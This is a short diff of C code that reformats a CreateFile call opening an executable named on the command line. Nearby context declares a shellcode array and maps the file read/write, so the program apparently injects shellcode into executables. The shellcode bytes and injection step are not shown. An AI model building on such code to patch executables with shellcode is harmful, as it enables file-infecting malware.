@@ -55,13 +55,7 @@ char shellcode[] =
 
 	// CreateFile -> http://msdn2.microsoft.com/en-us/library/aa363858.aspx
 
-	HANDLE executableHandle = CreateFile(argv[1] , 
-		GENERIC_READ | GENERIC_WRITE , 
-		FILE_SHARE_READ | FILE_SHARE_WRITE ,
-		NULL , 
-		OPEN_EXISTING ,
-		FILE_ATTRIBUTE_NORMAL, 
-		NULL) ; 
+	HANDLE executableHandle = CreateFile(argv[1] , GENERIC_READ | GENERIC_WRITE , FILE_SHARE_READ | FILE_SHARE_WRITE , NULL ,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,	NULL) ; 
 	// CreateFileMapping http://msdn.microsoft.com/en-us/library/aa366537(VS.85).aspx
 
 	HANDLE executableMappe = CreateFileMapping(executableHandle , NULL , PAGE_READWRITE , 0  , 0 , NULL) ; 
